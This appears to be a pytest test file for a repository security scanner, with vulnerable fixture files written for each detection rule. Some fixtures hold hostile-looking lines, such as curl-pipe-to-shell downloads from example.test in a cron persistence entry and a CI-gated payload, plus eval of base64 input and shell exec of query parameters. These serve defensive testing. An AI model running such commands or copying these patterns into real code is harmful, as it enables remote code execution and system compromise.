from __future__ import annotations

from pathlib import Path

from src.models import Severity
from src.rules.D_config.D1_dangerous_defaults import D1DangerousDefaultsRule
from src.rules.D_config.D3_open_bind_address import D3OpenBindAddressRule
from src.rules.E_auth.E1_unauthenticated_admin_endpoints import (
    E1UnauthenticatedAdminEndpointsRule,
)
from src.rules.E_auth.E2_missing_authorization_checks import (
    E2MissingAuthorizationChecksRule,
)
from src.rules.E_auth.E3_weak_jwt_validation import E3WeakJWTValidationRule
from src.rules.E_auth.E4_insecure_session_config import E4InsecureSessionConfigRule
from src.rules.E_auth.E6_exposed_debug_endpoints import E6ExposedDebugEndpointsRule
from src.rules.G_runtime.G1_runs_as_root import G1RunsAsRootRule
from src.rules.G_runtime.G3_broad_linux_capabilities import (
    G3BroadLinuxCapabilitiesRule,
)
from src.rules.G_runtime.G4_host_mount_risk import G4HostMountRiskRule
from src.rules.G_runtime.G5_exposed_code_execution import G5ExposedCodeExecutionRule
from src.rules.G_runtime.G6_unsafe_plugin_execution import G6UnsafePluginExecutionRule
from src.rules.G_runtime.G8_dangerous_k8s_security_context import (
    G8DangerousK8SSecurityContextRule,
)
from src.rules.G_runtime.G7_missing_sandbox import G7MissingSandboxRule
from src.rules.H_crypto.H6_expired_or_missing_tls_docs import (
    H6ExpiredOrMissingTLSDocsRule,
)
from src.rules.H_crypto.H1_plaintext_transport import H1PlaintextTransportRule
from src.rules.H_crypto.H4_custom_crypto import H4CustomCryptoRule
from src.rules.I_logging.I2_missing_audit_logs import I2MissingAuditLogsRule
from src.rules.I_logging.I3_verbose_error_leakage import I3VerboseErrorLeakageRule
from src.rules.I_logging.I4_unsafe_request_logging import I4UnsafeRequestLoggingRule
from src.rules.I_logging.I5_missing_security_event_logging import (
    I5MissingSecurityEventLoggingRule,
)
from src.rules.J_maintenance.J6_archived_repository import J6ArchivedRepositoryRule
from src.rules.K_license.K2_conflicting_licenses import K2ConflictingLicensesRule
from src.rules.K_license.K3_copyleft_risk import K3CopyleftRiskRule
from src.rules.K_license.K4_unknown_dependency_license import (
    K4UnknownDependencyLicenseRule,
)
from src.rules.K_license.K5_noncommercial_restriction import (
    K5NoncommercialRestrictionRule,
)
from src.rules.L_malware.L1_obfuscated_code import L1ObfuscatedCodeRule
from src.rules.L_malware.L3_conditional_payload import L3ConditionalPayloadRule
from src.rules.L_malware.L5_anti_analysis_patterns import L5AntiAnalysisPatternsRule
from src.rules.L_malware.L7_suspicious_persistence import L7SuspiciousPersistenceRule
from src.rules.B_dependencies.B3_suspicious_packages import B3SuspiciousPackagesRule
from src.rules.B_dependencies.B4_deprecated_dependencies import (
    B4DeprecatedDependenciesRule,
)


def test_E1_reports_admin_route_without_auth_and_ignores_guarded_route(tmp_path):
    (tmp_path / "app.py").write_text(
        "@app.route('/admin')\n"
        "def admin_panel():\n"
        "    return 'admin'\n\n"
        "@login_required\n"
        "@app.route('/internal')\n"
        "def internal():\n"
        "    return 'ok'\n",
        encoding="utf-8",
    )
    (tmp_path / "binary.py").write_bytes(b"\xff\xfe")

    records = E1UnauthenticatedAdminEndpointsRule().evaluate(tmp_path)

    assert len(records) == 1
    assert records[0].rule_id == "E-1"
    assert records[0].severity == Severity.MEDIUM
    assert records[0].file_path == "app.py"
    assert records[0].line == 1


def test_D1_reports_dangerous_defaults_and_skips_comments_and_binary(tmp_path):
    (tmp_path / "settings.env").write_text(
        "# password=password\n"
        "SECRET_KEY=changeme\n"
        "password=admin\n"
        "disable_auth=true\n"
        "tls_verify=false\n"
        "API_KEY=${API_KEY}\n",
        encoding="utf-8",
    )
    (tmp_path / "Dockerfile").write_text("ENV TOKEN=default\n", encoding="utf-8")
    (tmp_path / "ignored.txt").write_text("password=password\n", encoding="utf-8")
    (tmp_path / "bad.env").write_bytes(b"\xff\xfe")

    records = D1DangerousDefaultsRule().evaluate(tmp_path)

    assert {(r.file_path, r.line, r.severity) for r in records} == {
        ("settings.env", 2, Severity.MEDIUM),
        ("settings.env", 3, Severity.MEDIUM),
        ("settings.env", 4, Severity.MEDIUM),
        ("settings.env", 5, Severity.MEDIUM),
        ("Dockerfile", 1, Severity.MEDIUM),
    }


def test_D3_reports_open_bind_address_variants_and_ignores_comments(tmp_path):
    (tmp_path / "service.conf").write_text(
        "# host=0.0.0.0\n"
        "host=0.0.0.0\n"
        "listen: ::\n"
        "command = uvicorn app:app --host 0.0.0.0\n"
        "safe_host=127.0.0.1\n",
        encoding="utf-8",
    )
    (tmp_path / "start.sh").write_text("flask run --host=0.0.0.0\n", encoding="utf-8")
    (tmp_path / "ignored.txt").write_text("host=0.0.0.0\n", encoding="utf-8")
    (tmp_path / "bad.conf").write_bytes(b"\xff\xfe")

    records = D3OpenBindAddressRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("service.conf", 2, Severity.MEDIUM),
        ("service.conf", 3, Severity.MEDIUM),
        ("service.conf", 4, Severity.MEDIUM),
        ("start.sh", 1, Severity.MEDIUM),
    ]


def test_E2_reports_id_based_route_without_authorization(tmp_path):
    (tmp_path / "api.py").write_text(
        "@app.get('/users/{user_id}')\n"
        "def get_user(user_id):\n"
        "    return User.find_by_id(user_id)\n",
        encoding="utf-8",
    )
    (tmp_path / "safe_api.py").write_text(
        "@app.get('/projects/{project_id}')\n"
        "def get_project(project_id):\n"
        "    authorize(project_id)\n"
        "    return Project.find_by_id(project_id)\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = E2MissingAuthorizationChecksRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("api.py", 1, Severity.MEDIUM),
        ("api.py", 3, Severity.MEDIUM),
    ]


def test_E3_reports_high_and_medium_jwt_validation_risks(tmp_path):
    (tmp_path / "auth.py").write_text(
        "claims = jwt.decode(token, verify_signature=False)\n"
        "\n\n\n\n"
        "payload = jwt.decode(token)\n"
        "\n\n\n\n"
        "safe = jwt.decode(token, key=public_key, algorithms=['RS256'], audience='api')\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = E3WeakJWTValidationRule().evaluate(tmp_path)

    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.HIGH),
        (6, Severity.MEDIUM),
    ]


def test_G1_reports_root_and_missing_user_but_ignores_non_root_user(tmp_path):
    (tmp_path / "Dockerfile.root").write_text(
        "FROM python:3.12\nUSER root\n", encoding="utf-8"
    )
    (tmp_path / "Dockerfile.missing").write_text(
        "FROM python:3.12\nRUN echo ok\n", encoding="utf-8"
    )
    (tmp_path / "Dockerfile.safe").write_text(
        "FROM python:3.12\nUSER appuser\n", encoding="utf-8"
    )
    (tmp_path / "compose.yml").write_text(
        "services:\n  app:\n    user: '0:0'\n", encoding="utf-8"
    )
    (tmp_path / "pod.yaml").write_text(
        "securityContext:\n  runAsUser: 0\n", encoding="utf-8"
    )

    records = G1RunsAsRootRule().evaluate(tmp_path)

    assert {(r.file_path, r.line, r.severity) for r in records} == {
        ("Dockerfile.root", 2, Severity.HIGH),
        ("Dockerfile.missing", 1, Severity.MEDIUM),
        ("compose.yml", 3, Severity.HIGH),
        ("pod.yaml", 2, Severity.HIGH),
    }


def test_E4_reports_insecure_session_cookie_settings(tmp_path):
    (tmp_path / "production.env").write_text(
        "SESSION_COOKIE_SECURE=false\n"
        "SESSION_COOKIE_HTTPONLY=false\n"
        "SESSION_COOKIE_SAMESITE=None\n",
        encoding="utf-8",
    )
    (tmp_path / "safe.py").write_text(
        "session.regenerate()\nSESSION_COOKIE_SECURE=True\n", encoding="utf-8"
    )
    (tmp_path / "bad.env").write_bytes(b"\xff\xfe")

    records = E4InsecureSessionConfigRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("production.env", 1, Severity.HIGH),
        ("production.env", 2, Severity.MEDIUM),
        ("production.env", 3, Severity.MEDIUM),
        ("production.env", 1, Severity.LOW),
    ]


def test_E6_reports_exposed_debug_endpoint_and_ignores_guarded_route(tmp_path):
    (tmp_path / "prod_routes.py").write_text(
        "@app.get('/debug')\ndef debug():\n    return dump_state()\n",
        encoding="utf-8",
    )
    (tmp_path / "safe_routes.py").write_text(
        "@login_required\n@app.get('/metrics')\ndef metrics():\n    return ok()\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = E6ExposedDebugEndpointsRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("prod_routes.py", 1, Severity.HIGH),
    ]


def test_G8_reports_dangerous_k8s_security_context(tmp_path):
    k8s_dir = tmp_path / "k8s"
    k8s_dir.mkdir()
    (k8s_dir / "deployment.yaml").write_text(
        "apiVersion: v1\n"
        "kind: Pod\n"
        "securityContext:\n"
        "  runAsUser: 0\n"
        "  privileged: true\n"
        "  allowPrivilegeEscalation: true\n"
        "  hostNetwork: true\n"
        "  capabilities:\n"
        "    add: [SYS_ADMIN]\n",
        encoding="utf-8",
    )
    (tmp_path / "not-k8s.txt").write_text("runAsUser: 0\n", encoding="utf-8")
    (tmp_path / "broken.yaml").write_bytes(b"\xff\xfe")

    records = G8DangerousK8SSecurityContextRule().evaluate(tmp_path)

    assert [(r.line, r.severity) for r in records] == [
        (4, Severity.HIGH),
        (5, Severity.HIGH),
        (6, Severity.HIGH),
        (7, Severity.MEDIUM),
    ]


def test_H6_reports_missing_tls_docs_and_expired_certificate_hint(tmp_path):
    missing_records = H6ExpiredOrMissingTLSDocsRule().evaluate(tmp_path)
    assert len(missing_records) == 1
    assert missing_records[0].severity == Severity.MEDIUM

    docs = tmp_path / "docs"
    docs.mkdir()
    (docs / "tls.md").write_text(
        "TLS certificate expired yesterday.\nRenew with ACME before rotation.\n",
        encoding="utf-8",
    )

    records = H6ExpiredOrMissingTLSDocsRule().evaluate(tmp_path)
    assert [(r.file_path, r.line, r.severity) for r in records] == [
        (str(Path("docs/tls.md")), 1, Severity.HIGH),
    ]


def test_G7_reports_untrusted_execution_without_sandbox_and_downgrades_with_sandbox(
    tmp_path,
):
    (tmp_path / "runner.py").write_text(
        "user_code = request.body\nexec(user_code)\n", encoding="utf-8"
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = G7MissingSandboxRule().evaluate(tmp_path)
    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("runner.py", 2, Severity.HIGH),
    ]

    (tmp_path / "sandbox.md").write_text(
        "run user code in gvisor sandbox\n", encoding="utf-8"
    )
    records_with_sandbox = G7MissingSandboxRule().evaluate(tmp_path)
    assert [(r.file_path, r.line, r.severity) for r in records_with_sandbox] == [
        ("runner.py", 2, Severity.MEDIUM),
    ]


def test_I4_reports_unmasked_request_logging(tmp_path):
    (tmp_path / "logging.py").write_text(
        "logger.info(request.headers['Authorization'])\n"
        "logger.info(request.body)\n"
        "logger.info(redact(request.headers['Authorization']))\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = I4UnsafeRequestLoggingRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.HIGH),
        (2, Severity.MEDIUM),
    ]


def test_J6_reports_archived_github_repository(monkeypatch, tmp_path):
    rule = J6ArchivedRepositoryRule()
    monkeypatch.setattr(rule, "_extract_github_repo", lambda target: ("owner", "repo"))
    monkeypatch.setattr(rule, "_is_archived_on_github", lambda owner, repo: True)

    records = rule.evaluate(tmp_path)
    assert len(records) == 1
    assert records[0].severity == Severity.HIGH
    assert "owner/repo" in (records[0].message or "")

    monkeypatch.setattr(rule, "_is_archived_on_github", lambda owner, repo: False)
    assert rule.evaluate(tmp_path) == []
    monkeypatch.setattr(rule, "_extract_github_repo", lambda target: None)
    assert rule.evaluate(tmp_path) == []


def test_K3_reports_copyleft_risk_and_closed_distribution(monkeypatch, tmp_path):
    from src.rules.K_license import K3_copyleft_risk as k3_module
    from src.rules.K_license._license_utils import DependencyLicense

    monkeypatch.setattr(
        k3_module,
        "collect_dependency_licenses",
        lambda target: [DependencyLicense("libgpl", "GPL-3.0-only", "poetry.lock", 1)],
    )
    (tmp_path / "README.md").write_text(
        "All rights reserved proprietary app", encoding="utf-8"
    )

    records = K3CopyleftRiskRule().evaluate(tmp_path)
    assert len(records) == 1
    assert records[0].severity == Severity.HIGH
    assert "libgpl" in (records[0].message or "")

    monkeypatch.setattr(k3_module, "collect_dependency_licenses", lambda target: [])
    assert K3CopyleftRiskRule().evaluate(tmp_path) == []


def test_H1_reports_plaintext_transport_and_ignores_localhost(tmp_path):
    (tmp_path / "client.py").write_text(
        "TOKEN_URL = 'http://api.example.test/session?token=abc'\n"
        "HEALTH = 'http://localhost:8080/health'\n"
        "DOCS = 'ftp://files.example.test/public'\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = H1PlaintextTransportRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.HIGH),
        (3, Severity.MEDIUM),
    ]


def test_H4_reports_custom_crypto_and_downgrades_when_safe_library_present(tmp_path):
    (tmp_path / "crypto.py").write_text(
        "def encrypt_value(data):\n"
        "    return ''.join(chr(ord(c) ^ 42) for c in data)\n",
        encoding="utf-8",
    )
    (tmp_path / "safe_crypto.py").write_text(
        "from cryptography.fernet import Fernet\n"
        "def decrypt_value(data):\n"
        "    return data\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = H4CustomCryptoRule().evaluate(tmp_path)
    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("crypto.py", 1, Severity.HIGH),
        ("safe_crypto.py", 2, Severity.MEDIUM),
    ]


def test_B3_reports_suspicious_dependency_names_and_sources(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "reqests==1.0.0\n"
        "malware-helper==0.1\n"
        "internal @ https://example.test/pkg.tar.gz\n"
        "requests==2.31.0\n",
        encoding="utf-8",
    )

    records = B3SuspiciousPackagesRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.MEDIUM),
        (2, Severity.MEDIUM),
    ]


def test_B4_reports_deprecated_dependencies(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "django==2.2\nurllib3\neasy_install==1.0\nflask==3.0\n",
        encoding="utf-8",
    )

    records = B4DeprecatedDependenciesRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.MEDIUM),
        (2, Severity.LOW),
    ]


def test_G3_reports_broad_linux_capabilities(tmp_path):
    (tmp_path / "compose.yml").write_text(
        "run: docker run --cap-add=SYS_ADMIN image\n"
        "cap_add: [NET_ADMIN]\n"
        "  - SYS_PTRACE\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.yml").write_bytes(b"\xff\xfe")

    records = G3BroadLinuxCapabilitiesRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (2, Severity.HIGH),
        (3, Severity.MEDIUM),
    ]


def test_G4_reports_host_mount_risks(tmp_path):
    (tmp_path / "compose.yml").write_text(
        "run: docker run -v /:/host image\n"
        "volumes:\n"
        "  - /var/run/docker.sock:/var/run/docker.sock\n"
        "hostPath:\n"
        "  path: /etc\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.yml").write_bytes(b"\xff\xfe")

    records = G4HostMountRiskRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.HIGH),
        (3, Severity.HIGH),
        (4, Severity.MEDIUM),
        (5, Severity.HIGH),
    ]


def test_G5_reports_high_for_external_input_and_medium_for_local_code_execution(
    tmp_path,
):
    (tmp_path / "runner.py").write_text(
        "# eval(request.body)\npayload = request.body\neval(payload)\n",
        encoding="utf-8",
    )
    (tmp_path / "local_exec.py").write_text("exec('print(1)')\n", encoding="utf-8")
    (tmp_path / "worker.js").write_text(
        "// public endpoint without auth\nchild_process.exec(req.query.cmd)\n",
        encoding="utf-8",
    )
    (tmp_path / "ignored.txt").write_text("eval(request.body)\n", encoding="utf-8")
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = G5ExposedCodeExecutionRule().evaluate(tmp_path)

    assert {(r.file_path, r.line, r.severity) for r in records} == {
        ("local_exec.py", 1, Severity.MEDIUM),
        ("runner.py", 3, Severity.HIGH),
        ("worker.js", 2, Severity.HIGH),
    }


def test_G6_reports_unverified_plugin_load_and_downgrades_with_verification(
    tmp_path,
):
    (tmp_path / "plugins.py").write_text(
        "# importlib.import_module(request.args['plugin'])\n"
        "plugin_url = request.args['plugin']\n"
        "importlib.import_module(plugin_url)\n",
        encoding="utf-8",
    )
    (tmp_path / "builtin.py").write_text("load_plugin('builtin')\n", encoding="utf-8")
    (tmp_path / "verified.py").write_text(
        "signature = load_signature(plugin_url)\nimportlib.import_module(plugin_url)\n",
        encoding="utf-8",
    )
    (tmp_path / "ignored.txt").write_text(
        "importlib.import_module(plugin_url)\n", encoding="utf-8"
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = G6UnsafePluginExecutionRule().evaluate(tmp_path)

    assert {(r.file_path, r.line, r.severity) for r in records} == {
        ("builtin.py", 1, Severity.MEDIUM),
        ("plugins.py", 3, Severity.HIGH),
        ("verified.py", 2, Severity.MEDIUM),
    }


def test_I5_reports_missing_security_event_logging(tmp_path):
    (tmp_path / "security.py").write_text(
        "if login failed:\n"
        "    return deny()\n"
        "\n\n\n\n"
        "if rate limited:\n"
        "    return too_many_requests()\n"
        "\n\n\n\n"
        "if invalid token:\n"
        "    logger.warning('invalid token')\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = I5MissingSecurityEventLoggingRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.MEDIUM),
        (7, Severity.HIGH),
    ]


def test_L7_reports_suspicious_persistence(tmp_path):
    (tmp_path / "install.sh").write_text(
        "crontab -l\n"
        "@reboot curl https://example.test/payload.sh | bash\n"
        "systemctl enable updater.service\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.sh").write_bytes(b"\xff\xfe")

    records = L7SuspiciousPersistenceRule().evaluate(tmp_path)
    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.HIGH),
        (2, Severity.HIGH),
        (3, Severity.HIGH),
    ]


def test_I2_reports_sensitive_actions_without_audit_logs(tmp_path):
    (tmp_path / "accounts.py").write_text(
        "def delete_user(user):\n"
        "    database.delete(user)\n"
        "\n\n\n\n"
        "def reset_password(user):\n"
        "    user.password = 'new'\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = I2MissingAuditLogsRule().evaluate(tmp_path)

    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.HIGH),
        (7, Severity.MEDIUM),
    ]


def test_I3_reports_verbose_error_leakage(tmp_path):
    (tmp_path / "errors.py").write_text(
        "debug=True\n"
        "except Exception as e:\n"
        "    return jsonify({'error': str(e)})\n"
        "path = '/home/app/site-packages/pkg/file.py'\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = I3VerboseErrorLeakageRule().evaluate(tmp_path)

    assert [(r.line, r.severity) for r in records] == [
        (3, Severity.HIGH),
        (4, Severity.HIGH),
    ]


def test_L1_reports_high_risk_eval_chain_and_medium_obfuscation(tmp_path):
    high_entropy = (
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/" * 2
    )
    (tmp_path / "payload.py").write_text(
        "eval(base64.b64decode(user_input))\n"
        "value = String.fromCharCode(65, 66, 67)\n"
        f"blob = '{high_entropy}'\n"
        "safe = 'hello'\n",
        encoding="utf-8",
    )
    (tmp_path / "invalid.py").write_bytes(b"\xff\xfe")

    records = L1ObfuscatedCodeRule().evaluate(tmp_path)

    assert [(r.line, r.severity) for r in records] == [
        (1, Severity.HIGH),
        (2, Severity.MEDIUM),
        (3, Severity.MEDIUM),
    ]
    assert records[0].message is not None
    assert "eval/exec" in records[0].message


def test_L3_reports_environment_conditioned_payload(tmp_path):
    (tmp_path / "payload.py").write_text(
        "if os.environ.get('CI'):\n"
        "    os.system('curl https://example.test/payload.sh | sh')\n"
        "print('safe')\n",
        encoding="utf-8",
    )
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = L3ConditionalPayloadRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("payload.py", 1, Severity.HIGH),
        ("payload.py", 2, Severity.HIGH),
    ]


def test_L5_reports_anti_analysis_patterns_and_skips_unsupported_files(tmp_path):
    (tmp_path / "payload.py").write_text(
        "# ordinary comment\n"
        "if isDebuggerPresent():\n"
        "    return\n"
        "status = 'TracerPid: 1'\n"
        "if 'virtualbox' in sys_vendor:\n"
        "    pass\n"
        "time.sleep(1000)\n"
        "# anti-vm marker\n",
        encoding="utf-8",
    )
    (tmp_path / "ignored.txt").write_text("anti-vm\n", encoding="utf-8")
    (tmp_path / "bad.py").write_bytes(b"\xff\xfe")

    records = L5AntiAnalysisPatternsRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("payload.py", 2, Severity.HIGH),
        ("payload.py", 4, Severity.HIGH),
        ("payload.py", 5, Severity.HIGH),
        ("payload.py", 8, Severity.HIGH),
    ]


def test_K2_reports_conflicting_dependency_licenses(monkeypatch, tmp_path):
    from src.rules.K_license import K2_conflicting_licenses as k2_module
    from src.rules.K_license._license_utils import DependencyLicense

    monkeypatch.setattr(
        k2_module,
        "collect_dependency_licenses",
        lambda target: [
            DependencyLicense("legacy", "GPL-2.0-only", "poetry.lock", 10),
            DependencyLicense("http", "Apache-2.0", "package-lock.json", 20),
        ],
    )

    records = K2ConflictingLicensesRule().evaluate(tmp_path)

    assert len(records) == 1
    assert records[0].severity == Severity.MEDIUM
    assert records[0].file_path is None
    assert "GPL-2.0-ONLY" in (records[0].message or "")

    monkeypatch.setattr(k2_module, "collect_dependency_licenses", lambda target: [])
    assert K2ConflictingLicensesRule().evaluate(tmp_path) == []


def test_K4_reports_unknown_dependency_licenses(monkeypatch, tmp_path):
    from src.rules.B_dependencies._dependency_utils import DependencyDecl
    from src.rules.K_license import K4_unknown_dependency_license as k4_module
    from src.rules.K_license._license_utils import DependencyLicense

    monkeypatch.setattr(
        k4_module,
        "collect_dependency_declarations",
        lambda target: [
            DependencyDecl("known", "1.0.0", "requirements.txt", 1),
            DependencyDecl("unknown", "2.0.0", "requirements.txt", 2),
            DependencyDecl("missing", "3.0.0", "requirements.txt", 3),
        ],
    )
    monkeypatch.setattr(
        k4_module,
        "collect_dependency_licenses",
        lambda target: [
            DependencyLicense("known", "MIT", "metadata.json", None),
            DependencyLicense("unknown", "UNKNOWN", "metadata.json", None),
        ],
    )

    records = K4UnknownDependencyLicenseRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("requirements.txt", 2, Severity.MEDIUM),
        ("requirements.txt", 3, Severity.MEDIUM),
    ]

    monkeypatch.setattr(k4_module, "collect_dependency_declarations", lambda target: [])
    assert K4UnknownDependencyLicenseRule().evaluate(tmp_path) == []


def test_K5_reports_noncommercial_dependency_and_project_license(monkeypatch, tmp_path):
    from src.rules.K_license import K5_noncommercial_restriction as k5_module
    from src.rules.K_license._license_utils import DependencyLicense

    monkeypatch.setattr(
        k5_module,
        "collect_dependency_licenses",
        lambda target: [
            DependencyLicense("dataset", "CC-BY-NC-4.0", "package-lock.json", 7),
            DependencyLicense("safe", "MIT", "package-lock.json", 8),
        ],
    )
    (tmp_path / "LICENSE").write_text(
        "For non commercial use only.\n", encoding="utf-8"
    )

    records = K5NoncommercialRestrictionRule().evaluate(tmp_path)

    assert [(r.file_path, r.line, r.severity) for r in records] == [
        ("package-lock.json", 7, Severity.HIGH),
        ("LICENSE", 1, Severity.HIGH),
    ]
